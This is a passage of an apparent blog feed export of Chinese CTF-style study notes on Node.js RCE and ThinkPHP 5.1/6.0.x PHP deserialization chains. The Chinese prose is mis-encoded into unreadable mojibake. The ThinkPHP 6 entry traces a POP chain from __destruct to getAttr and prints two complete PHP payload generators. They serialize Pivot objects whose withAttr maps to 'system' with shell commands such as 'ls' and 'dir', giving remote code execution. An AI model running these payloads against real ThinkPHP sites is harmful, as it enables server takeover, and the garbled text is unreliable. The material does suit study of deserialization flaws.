    <content><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p>ç°åœ¨nodejsæ¥è¿›è¡Œrceçš„é¢˜ç›®è¶Šæ¥è¶Šå¤šäº†ï¼Œï¼Œå¿…é¡»å¾—å­¦ä¹ ä¸€æ³¢äº†ï¼Œè¿™é‡Œå¼€å§‹å­¦ä¹ </p>
<h2 id="requireå’Œexport"><a href="#requireå’Œexport" class="headerlink" title="requireå’Œexport"></a>requireå’Œexport</h2><p>åœ¨nodejså½“ä¸­ï¼Œexportç”¨äºå»ºç«‹æ–‡ä»¶çš„å¯¹å¤–æ¥å£ï¼Œä½ å¯ä»¥ç†è§£ä¸ºåœ¨nodejså½“ä¸­çš„å•ä¸ªæ–‡ä»¶éƒ½æ˜¯å°é—­çŠ¶æ€ï¼Œå¦‚æœä¸ç”¨exportæ¥å®šä¹‰å¯¹å¤–çš„æ¥å£ï¼Œå…¶ä»–æ–‡ä»¶æ˜¯æ— æ³•è¿›è¡Œimportæ“ä½œçš„</p>
<p>require ä¸ importçš„åŒºåˆ«å³æ˜¯requireè¿è¡Œç”¨æˆ·åŠ¨æ€çš„æ¥è·å–éœ€è¦çš„åŒ…</p>
<h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><p>Node.js å¯¹ä¼ ç»Ÿçš„ js æœ€å¤§çš„å‡çº§å°±æ˜¯æ”¯æŒäº†æ–‡ä»¶æ“ä½œå’Œç½‘ç»œç¼–ç¨‹ã€‚å†…ç½®çš„ <code>fs</code> æ¨¡å—å¯¹æ–‡ä»¶è¯»å†™æä¾›äº†å¼ºå¤§çš„æ”¯æŒï¼Œä¸ä»…æ”¯æŒä¼ ç»Ÿçš„åŒæ­¥æ–‡ä»¶è¯»å†™ï¼Œè¿˜æ”¯æŒé¢‡å…· js ç‰¹è‰²çš„å¼‚æ­¥æ–‡ä»¶è¯»å†™ã€‚</p>
]]></content>
      <tags>
        <tag>nodejs</tag>
        <tag>åŸå‹é“¾æ±¡æŸ“</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5.1ååºåˆ—åŒ–é“¾æ¢ç´¢</title>
    <url>/2021/03/31/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<p>è¯¥é“¾çš„æ€è·¯ä¸ºä»Windows.phpè§¦å‘ï¼Œå…·æœ‰æ‹¼æ¥çš„file_existsè¿›è¡Œæ“ä½œï¼Œä¹‹åæ‹¼æ¥åˆ°Conversion.phpä¸Šï¼Œè¿™é‡Œè‡ªå·±è¿˜åˆšå¤ç°åˆ°ä¸€åŠï¼Œä¸»è¦è®²ä¸€ä¸‹è‡ªå·±é‡è§çš„å›°éš¾ï¼ˆå¯èƒ½åªæœ‰æˆ‘ä¼šé‡è§çš„é—®é¢˜ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> <span class="title">extends</span> <span class="title">Pipes</span>&#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span>=[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$files=[]</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = $files;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">pivot</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">    $windows = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">array</span>($pivot));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($windows));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>é¦–å…ˆï¼Œæˆ‘é‡è§ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è°ƒç”¨åˆ°åˆ«çš„å±æ€§ï¼Œå…¶å®ç”¨useå³å¯ã€‚</p>
</li>
<li><p>ç¬¬äºŒï¼Œæ˜¯æˆ‘ä»¬å¦‚ä½•è°ƒç”¨ä¸€ä¸ªtraitï¼Œè¿™ç§çš„è¯ä¸€èˆ¬æˆ‘ä»¬è¦å¯»æ‰¾ä¸€ä¸ªuseåˆ°è¯¥å±æ€§çš„ç±»ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°Modelç±»ä½¿ç”¨äº†è¯¥ç±»ï¼Œä½†æ˜¯modelä¹Ÿæ˜¯æŠ½è±¡ç±»æ²¡åŠæ³•å®ä¾‹åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†æ‰¾modelçš„å­—ç±»ï¼Œè¿™é‡Œå°±æ‰¾åˆ°äº†Pivotç±»ï¼Œæ•…æˆ‘ä»¬çš„å†™æ³•å°±å¦‚ä¸Š</p>
<p>= =å·²ç»æ‰¾ä¸åˆ°è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œå®˜æ–¹å¦‚æœä¸‹è½½5.1çš„æ‰€æœ‰ç‰ˆæœ¬éƒ½æ‰¾ä¸åˆ°äº†</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp6.0.xååºåˆ—åŒ–å­¦ä¹ </title>
    <url>/2021/03/30/thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h1><p>è¿™åœ¨æ¡é“¾å½“ä¸­ï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯åˆ©ç”¨è¿™é‡Œè¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨ï¼Œå› ä¸ºä¸‰ä¸ªå‚æ•°å…¨éƒ¨å¯æ§æ‰€ä»¥æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸæ“ä½œ</p>
<p><img src="image-20210330112002247.png" alt="image-20210330112002247"></p>
<p>æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ‰¾å“ªé‡Œå¯ä»¥è§¦å‘è¿™é‡Œï¼š</p>
<p>ä¹‹åå°†ä¼šåœ¨getAtträ¸­æ‰¾åˆ°è¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> $name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $relation = <span class="literal">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> $e) &#123;</span><br><span class="line">            $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">            $value    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ä¸Šé¢èµ°å®Œå›æ¥ç»§ç»­æ‰§è¡ŒgetValue</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>å…ˆä¸ç®¡å¦‚ä½•æ§åˆ¶å‚æ•°ï¼Œæˆ‘ä»¬å†å¯»æ‰¾å¦‚ä½•è§¦å‘åˆ°getAttrï¼Œæœ€åæˆ‘ä»¬å°±å°†åœ¨Conversion.phpå½“ä¸­æ‰¾åˆ°toArrayã€‚</p>
<p>ä¸­é—´çš„ä»£ç å¾ˆå¤šä½†æ˜¯æ²¡å•¥ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                   $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                   $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">               <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) || <span class="literal">true</span> !== <span class="keyword">$this</span>-&gt;hidden[$key]) &#123;</span><br><span class="line">                   $item[$key] = $val-&gt;toArray();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">               $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">               <span class="comment">#<span class="doctag">TODO:</span> æœ€åæˆ‘ä»¬è¦è®©ä»–è°ƒåˆ°è¿™ä¸ªgetAttrå‡½æ•°æ¥æ¥</span></span><br><span class="line">           &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è§¦å‘toArrayï¼Œæœ€åæˆ‘ä»¬å°±ä¼šå‘ç°åœ¨__toStringæ—¶å¯ä»¥è§¦å‘ï¼Œæ•…æˆ‘ä»¬å°†å…¶downä¸‹æ¥.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> $options = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Conversion.phpä½œä¸ºååŠæ®µèµ·ç‚¹ï¼Œé€šè¿‡toStringè§¦å‘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å†ä¹‹åæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°çš„__toStringæ–¹æ³•ã€‚åœ¨Modelæ–¹æ³•å½“ä¸­å¯ä»¥å¯»æ‰¾åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">#<span class="doctag">TODO:</span> ä»è¿™é‡Œè§¦å‘</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;è¿›å…¥lazySaveå‡½æ•°ï¼&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°saveå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> $data = [], <span class="keyword">string</span> $sequence = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ•°æ®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// phpinfo();</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="comment">#<span class="doctag">TODO:</span> lazySaveå‡½æ•°ï¼Œä¸ºäº†ä¿è¯isEmptyä¸ºå‡éœ€è¦ç»™dataèµ‹å€¼</span></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦è½åˆ°updateDataå‡½æ•°å½“ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// äº‹ä»¶å›è°ƒ</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="comment">// echo &quot;è¿›å…¥updateDateå‡½æ•°&quot;.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// phpinfo();</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è·å–æœ‰æ›´æ–°çš„æ•°æ®</span></span><br><span class="line">       $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">           <span class="comment">// å…³è”æ›´æ–°</span></span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>($data[<span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">           <span class="comment">// è‡ªåŠ¨å†™å…¥æ›´æ–°æ—¶é—´</span></span><br><span class="line">           $data[<span class="keyword">$this</span>-&gt;updateTime]       = <span class="keyword">$this</span>-&gt;autoWriteTimestamp(<span class="keyword">$this</span>-&gt;updateTime);</span><br><span class="line">           <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;updateTime] = $data[<span class="keyword">$this</span>-&gt;updateTime];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// æ£€æŸ¥å…è®¸å­—æ®µ</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¦ç¡®ä¿è°ƒåˆ°checkAllowFieldså‡½æ•°å½“ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// æ£€æµ‹å­—æ®µ</span></span><br><span class="line">       <span class="comment">// phpinfo();</span></span><br><span class="line">       <span class="comment">// var_dump($this-&gt;field);</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">               </span><br><span class="line">               <span class="comment">#<span class="doctag">TODO:</span> </span></span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// å°±åœ¨è¿™é‡Œè¿›è¡Œäº†å­—ç¬¦ä¸²æ“ä½œ</span></span><br><span class="line">               $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line">               <span class="comment">// phpinfo();</span></span><br><span class="line">               </span><br><span class="line">               <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// phpinfo();</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°å…³é”®çš„åœ°æ–¹å°±è¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»¤$this-&gt;table ä¸ºmodelç±»å³å¯ï¼Œä½†æ˜¯å®é™…æ‹¼æ¥payloadå½“ä¸­æˆ‘ä»¬ä¼šå‘ç°è¯¥ç±»æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°å¯»æ‰¾å­ç±»</p>
<p>æœ€ç»ˆå¾—åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Conversion</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">&quot;axin&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;axin&quot;</span> =&gt; <span class="string">&quot;ls&quot;</span>];  <span class="comment">//ä½ æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œçš„é”®å€¼åªéœ€è¦ä¿æŒå’ŒwithAttré‡Œçš„é”®å€¼ä¸€è‡´å³å¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="comment">// use model\concern\Attribute;</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $field;</span><br><span class="line">    <span class="keyword">private</span> $schema;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $table;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;get();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$obj=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>



<p>æœ€åè‡ªå·±å†™çš„~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">protected</span> $json = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $lazySave =<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">private</span> $exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> $visible = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $relation = [<span class="string">&quot;foo&quot;</span>=&gt;<span class="string">&quot;12qw3&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $data = [<span class="string">&#x27;foo&#x27;</span> =&gt;[<span class="string">&quot;ysllz&quot;</span>=&gt;<span class="string">&quot;dir&quot;</span>]];  <span class="comment">//æœ€ç»ˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œysllz è¿™é‡Œè¦ä¿æŒä¸€è‡´ã€‚</span></span><br><span class="line">        <span class="keyword">private</span> $table;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">&quot;foo&quot;</span>=&gt;[<span class="string">&quot;ysllz&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>]];</span><br><span class="line">        <span class="keyword">protected</span> $jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a= <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table =$a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    $pivot1 =  <span class="keyword">new</span> Pivot();</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> Pivot($pivot1);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åé¢åœ¨è¿‡å®¢å¸ˆå‚…è¿™é‡Œåˆæ‰¾åˆ°ä¸¤ä¸ªPOPé“¾ï¼Œæ„Ÿè§‰å¾ˆç‰›èµ¶ç´§å¤ç°äº†</p>
<h1 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h1><p>è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„</p>
